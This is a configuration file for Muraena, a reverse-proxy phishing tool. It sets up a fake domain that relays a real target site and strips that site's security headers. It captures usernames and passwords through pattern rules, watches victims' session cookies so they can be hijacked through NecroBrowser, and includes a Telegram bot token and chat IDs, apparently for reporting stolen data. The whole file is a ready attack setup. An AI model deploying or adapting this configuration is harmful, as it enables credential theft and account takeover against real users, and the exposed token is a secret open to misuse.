[proxy]
    # Phishing domain
    phishing = "FAKEDOMAIN.com"

    # Target domain to proxy
    destination = "TARGETDOMAIN.com"

    # Listening IP address (IPv4 or IPv6)
        # e.g. 0.0.0.0 or [::]
    IP = "10.10.14.44"

        # Listen announces on the local network address.
        # The network must be "tcp", "tcp4", "tcp6"
        listener = "tcp4"

    # Listeninng TCP Port
    port = 443

    #
    # Simple port forwarding used when the phishing site listen on a port different from target domain, such as:
    # - test.muraena:8443
    # - victim.site: 443
    #
    # port mapping can be configured as follow: ListeningPort:TargetPort
    #portmapping = "443:31337"

    # Force HTTP to HTTPS redirection
    [proxy.HTTPtoHTTPS]
    enabled = true
    HTTPport = 80

#
# Proxy's replacement rules
#
[transform]

    # List of content types to exclude from the transformation process
    skipContentType = [ "font/*", "image/*" ]

    # Enable transformation rules in base64 strings
    [transform.base64]
    enabled = false
    padding = [ "=", "." ]

    [transform.request]
        headers = [
            "Cookie",
            "Referer",
            "Origin",
            "X-Forwarded-For"
        ]

    [transform.response]
        headers = [
            "Location",
            "WWW-Authenticate",
            "Origin",
            "Set-Cookie",
            "Access-Control-Allow-Origin"
        ]

        # Generic replacement rules:
        # it applies to body and any http header enabled for manipulation
        content = [
          [ "this is blue", "this is green" ]
        ]


#
# Proxy's wiping rules
#
[remove]

    [remove.request]
        headers = [
            "X-Forwarded-For",
                        #"User-Agent"
        ]

    [remove.response]
        headers = [
            "Content-Security-Policy",
            "Content-Security-Policy-Report-Only",
            "Strict-Transport-Security",
            "X-XSS-Protection",
            "X-Content-Type-Options",
            "X-Frame-Options",
            "Referrer-Policy",
            "X-Forwarded-For"
        ]

#
# Proxy's crafting rules
#
[craft]
        [craft.add]
                [craft.add.request]
                        [[craft.add.request.headers]]
                                #name = "User-Agent"
                                #value = "Ninja Agent"

                 [craft.add.response]
                         [[craft.add.response.headers]]

#
# Rudimental redirection rules
#
[[drop]]
    path = "/logout"
    redirectTo = "https://TARGETDOMAIN.com"

[[drop]]
    path = "/signout"
    redirectTo = "https://TARGETDOMAIN.com"


#
# LOG
#
[log]
    enabled = true
    filePath = "muraena.log"



#
# DB (redis)
#
[redis]
        host = "127.0.0.1"
        port = 6379
        password = ""

#
# TLS
#
[tls]
    enabled = true

    # Expand allows to replace the content of the certificate/key/root parameters to their content instead of the
    # filepath
    expand = false
    certificate = "/path/to/pem/req/x509/DOMAIN.com.pem"
    key = "/path/to/CSR/genrsa/request/DOMAIN.com.key"
    # root: cat cert.pem ca.pem > fullchain.pem
    root = "/path/to/fullchain/combined/from/my/pem/and/ca/pem/DOMAIN.com.fullchain.pem"

        #
        # Danger zone, be careful editing these settings
        #
        # Minimum supported TLS version: SSL3.0, TLS1.0, TLS1.1, TLS1.2, TLS1.3
        minVersion = "TLS1.2"
        preferServerCipherSuites = true
        sessionTicketsDisabled =  true
        # InsecureSkipVerify controls whether muraena verifies the server's
        # certificate chain and host name.
        insecureSkipVerify = true

        # RenegotiationSupport
        # Note: renegotiation is not defined in TLS 1.3.
        # Options:
        # - Never (default):disables renegotiation
        # - Once:                       allows a remote server to request renegotiation once per connection.
        # - Freely:                     allows a remote server to repeatedly request renegotiation.
        renegotiationSupport = "Never"

#
# CRAWLER
#
[crawler]
    enabled = false
    depth = 3
    upto = 20
    externalOriginPrefix = "www-"
    externalOrigins = [
      "*.anotherdomain.site",
      "example.dev"
    ]

#
# NECROBROWSER
#
[necrobrowser]
    enabled = false
    endpoint = "http://necrobrowser.url/xyz"
    profile = "./config/instrument.necro"

    [necrobrowser.keepalive]
        # GET on an authenticated endpoint to keep the session alive
        # every keepalive request is processed as its own necrotask
        enabled = false
        minutes = 5    # keeps alive the session every 5 minutes


    [necrobrowser.trigger]
        type = "cookies"
        values = ["user_session", "dotcom_user"]  # values can be cookies names or relative paths
        delay = 5   # check every 5 seconds victim's cookie jar to see if we need to instrument something

#
# STATIC SERVER
#
[staticServer]
    enabled = false
    port = 8080
    localPath = "./static/"
    urlPath = "/evilpath/"


#
# WATCHDOG
#
[watchdog]
        enabled = false
        # Monitor rules file changes and reload
        dynamic = true
        rules = "./config/watchdog.rules"
        geoDB = "./config/geoDB.mmdb"

#
# TRACKING
#
[tracking]
enabled = false

    # Tracking types can be Path || Query (default)
    #
    # query:
    #  ?identifier=trackingID
    #
    # path:
    #   /trackingID
    #
    type = "query"

    # Tracking identifier
    identifier = "_gat"

    # Rule to generate and validate a tracking identifier
    regex = "[a-zA-Z0-9]{5}"

        # Tracking initial HTTP Header (empty is: If-Range)
        header = "X-Whatveryouwant-Header"

        # Landing HTTP Header (empty is: X-If-Landing-Redirect)
        landing = "X-Whatveryouwant-Landing-Header"

    # Set speific victim's IP address
    # ipSource = ""

    # Set tracking cookie for a custom domain
    # domain = ""

    [tracking.urls]
    credentials = [ "/session" ]
    authSession = [ "/settings/profile" ]

    [[tracking.patterns]]
    label = "Username"
    matching = "login"
    start = "login="
    end = "&password="

    [[tracking.patterns]]
    label = "Password"
    matching = "password"
    start = "password="
    end = "&"



#
# TELEGRAM
#
[telegram]
enabled = false
botToken = "1587304999:AAG4cH8VzJ1b8tbamq0VZM9C01KkDjY5IFo"
chatIDs = ["-1001856562703"]
